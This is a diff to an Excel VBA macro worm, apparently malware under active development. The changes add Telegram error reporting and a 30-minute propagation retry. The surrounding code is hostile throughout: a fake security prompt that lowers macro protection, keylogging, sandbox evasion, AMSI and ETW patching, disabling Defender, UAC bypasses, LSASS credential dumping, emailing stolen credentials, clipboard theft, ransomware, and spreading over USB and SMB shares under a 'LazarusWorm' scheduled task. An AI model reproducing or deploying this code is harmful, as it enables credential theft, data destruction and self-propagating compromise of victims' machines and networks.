@@ -137,10 +137,32 @@ Private gWatchdogActive As Boolean
 Private g_stolenCredentials As Object
 Private g_emailTargets As Object
 
+' Propagation retry flags
+Private g_usbPropagated As Boolean
+Private g_smbPropagated As Boolean
+Private g_retryCount As Integer
+
+' ========================
+' ERROR HANDLING UTILITIES
+' ========================
+Private Sub LogError(procedureName As String, errDesc As String)
+    On Error Resume Next
+    SendToTelegram "ERROR|" & procedureName & "|" & errDesc
+End Sub
+
+Private Sub SafeCall(procName As String, proc As Variant)
+    On Error GoTo ErrHandler
+    Call proc
+    Exit Sub
+ErrHandler:
+    LogError procName, Err.Description
+End Sub
+
 ' ========================
 ' UTILITIES
 ' ========================
 Function GetTempDir() As String
+    On Error Resume Next
     GetTempDir = Environ("TEMP")
     If Right(GetTempDir, 1) <> "\" Then GetTempDir = GetTempDir & "\"
 End Function
@@ -221,7 +243,6 @@ End Sub
 ' ========================
 Sub CreateEnableMacrosButton()
     On Error Resume Next
-    ' Add a button to the first worksheet that calls EnableMacrosViaHTA
     Dim ws As Worksheet: Set ws = ThisWorkbook.Worksheets(1)
     Dim btn As Object
     On Error Resume Next
@@ -233,7 +254,6 @@ Sub CreateEnableMacrosButton()
     btn.Object.BackColor = RGB(0, 150, 0)
     btn.Object.ForeColor = RGB(255, 255, 255)
     btn.Object.Font.Bold = True
-    ' Assign macro
     btn.Object.OnAction = "EnableMacrosViaHTA"
     ws.Shapes(btn.Name).ZOrder msoBringToFront
     ws.Range("A1").Value = "IMPORTANT: Click the green button below to enable macros and view your document."
@@ -244,14 +264,11 @@ Sub CreateEnableMacrosButton()
 End Sub
 
 Public Sub EnableMacrosViaHTA()
-    ' Creates an HTA that writes registry keys to lower macro security and enable VBA project access,
-    ' then restarts Excel. This HTA runs independently and does not require macros to be already enabled.
     On Error Resume Next
     Dim htaPath As String: htaPath = GetTempDir() & "EnableMacros.hta"
     Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
     Dim f As Object: Set f = fso.CreateTextFile(htaPath, True)
-    f.WriteLine "<html>"
-    f.WriteLine "<head><title>Security Warning</title>"
+    f.WriteLine "<html><head><title>Security Warning</title>"
     f.WriteLine "<HTA:APPLICATION ID='objEnable' APPLICATIONNAME='EnableMacros' WINDOWSTATE='normal' SHOWINTASKBAR='yes'/>"
     f.WriteLine "<script language='VBScript'>"
     f.WriteLine "Sub Window_OnLoad"
@@ -260,7 +277,6 @@ Public Sub EnableMacrosViaHTA()
     f.WriteLine "Sub EnableClick()"
     f.WriteLine "  Dim WSH: Set WSH = CreateObject(""WScript.Shell"")"
     f.WriteLine "  On Error Resume Next"
-    f.WriteLine "  ' Lower macro security for current user"
     f.WriteLine "  WSH.RegWrite ""HKCU\Software\Microsoft\Office\16.0\Excel\Security\VBAWarnings"", 1, ""REG_DWORD"""
     f.WriteLine "  WSH.RegWrite ""HKCU\Software\Microsoft\Office\16.0\Excel\Security\AccessVBOM"", 1, ""REG_DWORD"""
     f.WriteLine "  WSH.RegWrite ""HKCU\Software\Microsoft\Office\15.0\Excel\Security\VBAWarnings"", 1, ""REG_DWORD"""
@@ -269,29 +285,24 @@ Public Sub EnableMacrosViaHTA()
     f.WriteLine "  WSH.RegWrite ""HKCU\Software\Microsoft\Office\14.0\Excel\Security\AccessVBOM"", 1, ""REG_DWORD"""
     f.WriteLine "  WSH.RegWrite ""HKCU\Software\Microsoft\Office\12.0\Excel\Security\VBAWarnings"", 1, ""REG_DWORD"""
     f.WriteLine "  WSH.RegWrite ""HKCU\Software\Microsoft\Office\12.0\Excel\Security\AccessVBOM"", 1, ""REG_DWORD"""
-    f.WriteLine "  ' Also try HKLM if possible"
     f.WriteLine "  WSH.RegWrite ""HKLM\SOFTWARE\Microsoft\Office\16.0\Excel\Security\VBAWarnings"", 1, ""REG_DWORD"""
     f.WriteLine "  WSH.RegWrite ""HKLM\SOFTWARE\Microsoft\Office\16.0\Excel\Security\AccessVBOM"", 1, ""REG_DWORD"""
     f.WriteLine "  WSH.RegWrite ""HKLM\SOFTWARE\Policies\Microsoft\Office\16.0\Excel\Security\VBAWarnings"", 1, ""REG_DWORD"""
-    f.WriteLine "  ' Add trusted location for this workbook"
     f.WriteLine "  WSH.RegWrite ""HKCU\Software\Microsoft\Office\16.0\Excel\Security\Trusted Locations\Location" & Int(Rnd * 10000) & "\Path"", Left(WSH.ExpandEnvironmentStrings(""%USERPROFILE%""), 3) & ""\"", ""REG_SZ"""
     f.WriteLine "  MsgBox ""Security settings updated. Excel will now restart to apply changes."", vbInformation, ""Success"""
     f.WriteLine "  WSH.Run ""taskkill /f /im excel.exe"", 0, False"
-    f.WriteLine "  ' Wait a bit then restart Excel with this workbook"
     f.WriteLine "  WSH.Run ""excel.exe """ & gSelfPath & """", 0, False"
     f.WriteLine "  window.close"
     f.WriteLine "End Sub"
     f.WriteLine "</script>"
     f.WriteLine "<style>body{font-family:Arial;margin:20px;background:#f0f0f0}.btn{padding:10px 20px;font-size:16px;background:#4CAF50;color:white;border:none;cursor:pointer}</style>"
-    f.WriteLine "</head>"
-    f.WriteLine "<body>"
+    f.WriteLine "</head><body>"
     f.WriteLine "<h2>Microsoft Excel Security Notice</h2>"
     f.WriteLine "<p>This document contains macros that are required to display the content correctly.</p>"
     f.WriteLine "<p>Click the button below to automatically enable macros for this document.</p>"
     f.WriteLine "<button class='btn' onclick='EnableClick()'>Enable Macros</button>"
     f.WriteLine "</body></html>"
     f.Close
-    ' Execute the HTA
     CreateObject("WScript.Shell").Run "mshta.exe """ & htaPath & """", 1, False
 End Sub
 
@@ -348,7 +359,6 @@ Public Sub PollingKeylogger()
     On Error Resume Next
     Static lastKeys(255) As Integer
     Dim i As Integer, state As Integer, keyName As String
-    
     For i = 8 To 255
         state = GetAsyncKeyState(i)
         If state And &H8000 Then
@@ -371,7 +381,6 @@ Public Sub PollingKeylogger()
             lastKeys(i) = 0
         End If
     Next i
-    
     Application.OnTime Now + TimeValue("00:00:00.05"), "PollingKeylogger"
 End Sub
 
@@ -418,12 +427,10 @@ End Function
 ' ========================
 Function IsSandbox() As Boolean
     On Error Resume Next
-    ' RAM check
     Dim memInfo As MEMORYSTATUSEX: memInfo.dwLength = Len(memInfo)
     GlobalMemoryStatusEx memInfo
     If memInfo.ullTotalPhys < 2 * 1024 * 1024 * 1024 Then IsSandbox = True: Exit Function
     
-    ' Disk check (C:\)
     Dim freeBytes As Currency, totalBytes As Currency
     Dim ret As Long
     ret = GetDiskFreeSpaceExA("C:\", freeBytes, totalBytes, ByVal 0)
@@ -435,10 +442,7 @@ Function IsSandbox() As Boolean
     End If
     If totalBytesLL < 64 * 1024 * 1024 * 1024 Then IsSandbox = True: Exit Function
     
-    ' Uptime check
     If GetTickCount64() < 5 * 60 * 1000 Then IsSandbox = True: Exit Function
-    
-    ' Process count
     Dim snap As LongPtr: snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
     If snap <> -1 Then
         Dim pe As PROCESSENTRY32: pe.dwSize = Len(pe)
@@ -449,19 +453,14 @@ Function IsSandbox() As Boolean
         CloseHandle snap
         If count < 20 Then IsSandbox = True: Exit Function
     End If
-    
-    ' Mouse movement
     If GetSystemMetrics(SM_MOUSEPRESENT) <> 0 Then
         Dim p1 As POINTAPI, p2 As POINTAPI
         GetCursorPos p1: StealthSleep 100: GetCursorPos p2
         If p1.x = p2.x And p1.y = p2.y Then IsSandbox = True: Exit Function
     End If
-    
-    ' VM artifacts (files)
     Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
     If fso.FileExists("C:\windows\system32\vmtools.dll") Or fso.FileExists("C:\windows\system32\vboxhook.dll") Then IsSandbox = True: Exit Function
     
-    ' VM processes
     Dim vmProcs As Variant: vmProcs = Array("vmtoolsd.exe", "vboxservice.exe", "vboxtray.exe", "VGAuthService.exe")
     Dim snap2 As LongPtr: snap2 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
     If snap2 <> -1 Then
@@ -481,11 +480,9 @@ Function IsSandbox() As Boolean
         CloseHandle snap2
     End If
     
-    ' Username keywords
     Dim user As String: user = LCase(Environ("USERNAME"))
     If InStr(user, "sandbox") > 0 Or InStr(user, "malware") > 0 Or InStr(user, "test") > 0 Or InStr(user, "analyst") > 0 Then IsSandbox = True: Exit Function
     
-    ' Common sandbox driver files
     Dim sandFiles As Variant: sandFiles = Array("C:\sample.exe", "C:\tools\", "C:\analysis\")
     For Each f In sandFiles
         If fso.FileExists(f) Then IsSandbox = True: Exit Function
@@ -494,12 +491,10 @@ End Function
 
 Sub PatchAMSI()
     On Error Resume Next
-    ' Registry method (persistent)
     Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
     wsh.RegWrite "HKLM\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}\Enabled", 0, "REG_DWORD"
     wsh.RegWrite "HKCU\Software\Microsoft\Windows Script\Settings\AmsiEnable", 0, "REG_DWORD"
     
-    ' In-memory patching (try both amsi.dll and amsi.dll's AmsiScanBuffer)
     Dim hAmsi As LongPtr: hAmsi = LoadLibraryA("amsi.dll")
     If hAmsi <> 0 Then
         Dim pAmsiScanBuffer As LongPtr: pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer")
@@ -518,11 +513,9 @@ End Sub
 
 Sub KillETW()
     On Error Resume Next
-    ' Registry
     Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
     wsh.RegWrite "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Security\ETWEnabled", 0, "REG_DWORD"
     
-    ' In-memory patch for ntdll!EtwEventWrite
     Dim hNtdll As LongPtr: hNtdll = GetModuleHandleA("ntdll.dll")
     If hNtdll <> 0 Then
         Dim pEtwEventWrite As LongPtr: pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite")
@@ -541,15 +534,12 @@ End Sub
 Sub DisableDefender()
     On Error Resume Next
     Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
-    ' Service control
     wsh.Run "sc stop WinDefend >nul 2>&1", 0, True
     wsh.Run "sc config WinDefend start= disabled >nul 2>&1", 0, True
-    ' Registry policies
     wsh.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware", 1, "REG_DWORD"
     wsh.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableBehaviorMonitoring", 1, "REG_DWORD"
     wsh.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableOnAccessProtection", 1, "REG_DWORD"
     wsh.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableRealtimeMonitoring", 1, "REG_DWORD"
-    ' PowerShell exclusion for our file
     On Error Resume Next
     wsh.Run "powershell -c ""Add-MpPreference -ExclusionPath '" & gSelfPath & "'"" >nul 2>&1", 0, True
     wsh.Run "powershell -c ""Add-MpPreference -ExclusionProcess '" & Application.Name & "'"" >nul 2>&1", 0, True
@@ -628,7 +618,6 @@ End Sub
 
 Sub ElevatePrivileges()
     If IsUserAdmin() Then Exit Sub
-    ' Try methods that may work on newer Windows
     UACBypass_Sdclt
     If IsUserAdmin() Then Exit Sub
     UACBypass_Cmstp
@@ -637,7 +626,6 @@ Sub ElevatePrivileges()
     If IsUserAdmin() Then Exit Sub
     UACBypass_DiskCleanup
     If IsUserAdmin() Then Exit Sub
-    ' Legacy methods (patched but attempt)
     UACBypass_Fodhelper
     If IsUserAdmin() Then Exit Sub
     UACBypass_ComputerDefaults
@@ -749,12 +737,10 @@ Sub DumpLSASS()
     If pid = 0 Then Exit Sub
     Dim dumpPath As String: dumpPath = GetTempDir() & "lsass.dmp"
     Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
-    ' Method 1: comsvcs (often fails on modern Windows)
     wsh.Run "rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump " & pid & " " & dumpPath & " full", 0, True
     StealthSleep 3000
     Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
     If Not fso.FileExists(dumpPath) Then
-        ' Method 2: procdump (download)
         Dim procdumpPath As String: procdumpPath = GetTempDir() & "procdump.exe"
         Dim procdumpUrls As Variant: procdumpUrls = Array("https://live.sysinternals.com/procdump.exe", "https://download.sysinternals.com/files/Procdump.zip")
         Dim url As Variant
@@ -1074,7 +1060,6 @@ Private Function SendEmailWithCredential(cred As String, toEmail As String, atta
     End Select
     If smtpServer = "" Then Exit Function
     
-    ' Method 1: CDO.Message
     Dim msg As Object: Set msg = CreateObject("CDO.Message")
     Dim config As Object: Set config = CreateObject("CDO.Configuration")
     Dim fields As Object: Set fields = config.Fields
@@ -1098,7 +1083,6 @@ Private Function SendEmailWithCredential(cred As String, toEmail As String, atta
     SendEmailWithCredential = True
     Exit Function
 Fail:
-    ' Method 2: Outlook COM (fallback – uses current Outlook session if available)
     On Error Resume Next
     Dim olApp As Object: Set olApp = CreateObject("Outlook.Application")
     If Not olApp Is Nothing Then
@@ -1352,7 +1336,6 @@ Public Sub ClipboardMonitorLoop()
     Dim text As String
     Static lastText As String
     If OpenClipboard(0) Then
-        ' Try Unicode first
         Dim hData As LongPtr: hData = GetClipboardData(13)
         If hData Then
             Dim pData As LongPtr: pData = GlobalLock(hData)
@@ -1361,7 +1344,6 @@ Public Sub ClipboardMonitorLoop()
                 GlobalUnlock hData
             End If
         End If
-        ' Fallback to ANSI
         If text = "" Then
             hData = GetClipboardData(1)
             If hData Then
@@ -1445,7 +1427,7 @@ Sub SetClipboardContent(txt As String)
 End Sub
 
 ' ========================
-' PROPAGATION – USB & SMB WITH FALLBACKS
+' PROPAGATION – USB & SMB WITH FALLBACKS AND RETRY
 ' ========================
 Sub USBPropagation()
     On Error Resume Next
@@ -1473,22 +1455,27 @@ Sub USBPropagation()
     ' Fallback: if no removable drive, copy to any writable network drive
     If Not copiedAny Then
         Dim net As Object: Set net = CreateObject("WScript.Network")
-        Dim drives As Variant: drives = net.EnumNetworkDrives
-        Dim i As Integer
-        For i = 0 To drives.Count - 1 Step 2
-            Dim netDrive As String: netDrive = drives(i + 1) & "\"
-            If fso.FolderExists(netDrive) Then
-                fso.CopyFile gSelfPath, netDrive & "svch0st.xlsm", True
-                SendToTelegram "NETWORK_DRIVE_PROPAGATED|" & netDrive
-                copiedAny = True
-            End If
-        Next
+        If Not net Is Nothing Then
+            Dim drives As Variant: drives = net.EnumNetworkDrives
+            Dim i As Integer
+            For i = 0 To drives.Count - 1 Step 2
+                Dim netDrive As String: netDrive = drives(i + 1) & "\"
+                If fso.FolderExists(netDrive) Then
+                    fso.CopyFile gSelfPath, netDrive & "svch0st.xlsm", True
+                    SendToTelegram "NETWORK_DRIVE_PROPAGATED|" & netDrive
+                    copiedAny = True
+                End If
+            Next
+        End If
     End If
     
-    If Not copiedAny Then SendToTelegram "USB_PROPAGATION_NO_TARGETS"
+    If copiedAny Then
+        g_usbPropagated = True
+    Else
+        SendToTelegram "USB_PROPAGATION_NO_TARGETS"
+    End If
 End Sub
 
-' Helper: get local network IPs for SMB scanning
 Private Function GetLocalNetworkIPs() As Collection
     On Error Resume Next
     Dim ips As New Collection
@@ -1523,12 +1510,18 @@ Private Function GetLocalNetworkIPs() As Collection
     Set GetLocalNetworkIPs = ips
 End Function
 
-' Helper: check if SMB port (445) is open
 Private Function IsPortOpen(ip As String, port As Integer) As Boolean
     On Error Resume Next
-    Dim sock As Object: Set sock = CreateObject("MSWinsock.Winsock")
-    If sock Is Nothing Then Exit Function
-    sock.Protocol = 0 ' TCP
+    ' Try Winsock first
+    Dim sock As Object
+    On Error Resume Next
+    Set sock = CreateObject("MSWinsock.Winsock")
+    If sock Is Nothing Then
+        ' Fallback: use simple TCP socket via WinHttp? Not possible. Skip port scanning.
+        IsPortOpen = False
+        Exit Function
+    End If
+    sock.Protocol = 0
     sock.Connect ip, port
     Dim startTime As Double: startTime = Timer
     Do While sock.State <> 7 And Timer - startTime < 2
@@ -1538,12 +1531,10 @@ Private Function IsPortOpen(ip As String, port As Integer) As Boolean
     sock.Close
 End Function
 
-' Helper: attempt to copy and execute on remote target
 Private Sub CopyToRemote(targetIP As String, username As String, password As String)
     On Error Resume Next
     Dim remotePath As String: remotePath = "\\" & targetIP & "\C$\svch0st.xlsm"
     Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
-    ' Try ADMIN$ first
     Dim share As String: share = "\\" & targetIP & "\ADMIN$"
     Dim net As Object: Set net = CreateObject("WScript.Network")
     On Error Resume Next
@@ -1551,7 +1542,6 @@ Private Sub CopyToRemote(targetIP As String, username As String, password As Str
     If Err.Number = 0 Then
         fso.CopyFile gSelfPath, remotePath, True
         SetAttr remotePath, vbHidden + vbSystem
-        ' Create scheduled task
         Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
         wsh.Run "schtasks /create /tn ""LazarusWorm"" /tr """ & remotePath & """ /sc onlogon /s " & targetIP & " /ru SYSTEM /f", 0, True
         SendToTelegram "SMB_PROPAGATED|" & targetIP & "|" & username
@@ -1561,7 +1551,6 @@ End Sub
 
 Sub SMBPropagation()
     On Error Resume Next
-    ' First try net view (traditional)
     Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
     Dim out As String: out = wsh.Exec("net view").StdOut.ReadAll
     Dim targets As New Collection
@@ -1577,7 +1566,6 @@ Sub SMBPropagation()
         Next
     End If
     
-    ' If net view gave no results, scan local subnet
     If targets.Count = 0 Then
         Dim ips As Collection: Set ips = GetLocalNetworkIPs()
         If Not ips Is Nothing Then
@@ -1595,7 +1583,6 @@ Sub SMBPropagation()
         Exit Sub
     End If
     
-    ' Credential list (blank, admin, stolen)
     Dim creds As New Collection
     creds.Add "", "blank"
     creds.Add "Administrator", "admin"
@@ -1609,7 +1596,6 @@ Sub SMBPropagation()
         Next
     End If
     
-    ' Attempt propagation to each target
     Dim target As Variant
     For Each target In targets
         Dim targetIP As String: targetIP = Replace(target, "\\", "")
@@ -1619,6 +1605,24 @@ Sub SMBPropagation()
             CopyToRemote targetIP, username, password
         Next
     Next
+    g_smbPropagated = True
+End Sub
+
+' ========================
+' RETRY MECHANISM – SCHEDULED EVERY 30 MINUTES
+' ========================
+Public Sub RetryPropagation()
+    On Error Resume Next
+    If Not g_usbPropagated Then
+        USBPropagation
+    End If
+    If Not g_smbPropagated Then
+        SMBPropagation
+    End If
+    ' Schedule again after 30 minutes if not both succeeded
+    If (Not g_usbPropagated) Or (Not g_smbPropagated) Then
+        Application.OnTime Now + TimeValue("00:30:00"), "RetryPropagation"
+    End If
 End Sub
 
 ' ========================
@@ -1775,11 +1779,8 @@ Public Sub Watchdog()
     If gWatchdogActive Then Exit Sub
     gWatchdogActive = True
     On Error Resume Next
-    ' Check if the main Excel instance is still running with the hidden loop
-    ' If not, restart it via VBS launcher
     Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
     wsh.Run "wscript.exe """ & Environ("APPDATA") & "\Microsoft\Windows\Start Menu\Programs\Startup\LazarusLauncher.vbs""", 0, False
-    ' Schedule next check
     Application.OnTime Now + TimeValue("00:01:00"), "Watchdog"
 End Sub
 
@@ -1802,9 +1803,7 @@ Public Sub AutoExec()
         wsh.RegWrite "HKCU\Software\Microsoft\Office\16.0\Excel\Security\VBAWarnings", 1, "REG_DWORD"
         wsh.RegWrite "HKCU\Software\Microsoft\Office\15.0\Excel\Security\AccessVBOM", 1, "REG_DWORD"
         wsh.RegWrite "HKCU\Software\Microsoft\Office\15.0\Excel\Security\VBAWarnings", 1, "REG_DWORD"
-        ' Also create the button and HTA launcher for social engineering
         CreateEnableMacrosButton
-        ' Optionally launch the HTA automatically (but user might not like it)
         ' EnableMacrosViaHTA   ' Uncomment if you want the HTA to appear automatically
     End If
     
@@ -1841,6 +1840,9 @@ Public Sub AutoExec()
         RunRansomware
         DeploySocialEngineeringUI
         Application.OnTime Now + TimeValue("00:00:00.5"), "ClipboardMonitorLoop"
+        
+        ' Start retry mechanism for propagation
+        Application.OnTime Now + TimeValue("00:30:00"), "RetryPropagation"
     End If
     
     Application.Visible = False
@@ -1851,7 +1853,7 @@ Public Sub AutoExec()
     Loop
     Exit Sub
 ErrorHandler:
-    SendToTelegram "ERROR|" & Err.Description
+    SendToTelegram "ERROR|AutoExec|" & Err.Description
 End Sub
 
 ' ========================
